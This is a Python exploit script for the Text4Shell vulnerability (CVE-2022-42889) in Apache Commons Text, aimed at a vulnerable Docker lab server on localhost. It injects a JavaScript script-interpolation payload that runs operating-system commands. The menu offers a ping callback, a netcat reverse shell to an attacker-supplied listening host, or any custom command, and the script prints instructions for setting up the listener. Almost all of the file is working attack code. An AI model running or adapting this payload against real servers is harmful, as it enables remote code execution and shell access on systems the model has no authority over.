"""
@Author: Stavros Gkounis (purpl3ch4m)
@Date: 21/10/2022
@Reference: https://github.com/karthikuj/cve-2022-42889-text4shell-docker
@Description: This code makes malicious requests to a Text4Shell vulnerable server which has been set up according to the information provided by @Reference
"""

import requests
import time
import psutil

def askUserForNIC():
    interfaces = psutil.net_if_addrs()
    interfacesList = []
    print("[*] Network Inteface Cards (NICs) Identified:")
    for index, key in enumerate(interfaces.keys()):
        interfacesList.append(key)
        print("\t{} - {}".format(index, key))
    nic = input("[*] Select NIC by number: ")
    return interfacesList[int(nic)]

def askListeningHostIP():
    lhost = input("[*] LHOST: ")
    return lhost

def attackVectorMenu():
    lhost = askListeningHostIP()
    lport = 1337
    commands = {
        'ping': "ping -c4 " + lhost,
        'netcat': "nc " + lhost + " " + str(lport) + " -e /bin/sh"
    }
    return commands

def MaliciousCommand():
    menu = attackVectorMenu()
    nic = askUserForNIC()
    cmd = ""

    print("[*] Choose one of the following options:")
    option = input("\t- PING (1)\n\t- REVERSE SHELL (2)\n\t- CUSTOM PAYLOAD (3)\n: ")
    if(int(option) == 1):
        cmd = menu['ping']
        print("[!] Manually execute: sudo tcpdump -i " + nic + " icmp")
        print("[!] Process will pause for 1 minute")
        time.sleep(60)
    elif(int(option) == 2):
        cmd = menu['netcat']
        print("[!] Manually execute: nc -lnvp 1337")
        print("[!] Process will pause for 1 minute")
        time.sleep(60)
    elif(int(option) == 3):
        cmd = input("[*] Enter Malicious command: ")

    return cmd

def urlEncodePayload():
    JAVAEXEC = "${script:javascript:java.lang.Runtime.getRuntime().exec('" + MaliciousCommand() + "')}"
    payload = requests.utils.quote(JAVAEXEC)
    return payload

def requestMaliciousPayload():
    baseURL = "http://localhost/text4shell/attack?search="
    cmd = urlEncodePayload()
    URI = baseURL + cmd
    print("[*] Delivering Payload: {}".format(cmd))
    print("[*] Attempting Request: {}".format(URI))
    req = requests.get(URI)
    if(req.status_code == 200):
        print("[+] Payload delivered successfully")
    else:
        print("[!] Delivery may be failed. Check manually!")

def exploit():
    requestMaliciousPayload()

if(__name__ == "__main__"):
    exploit()
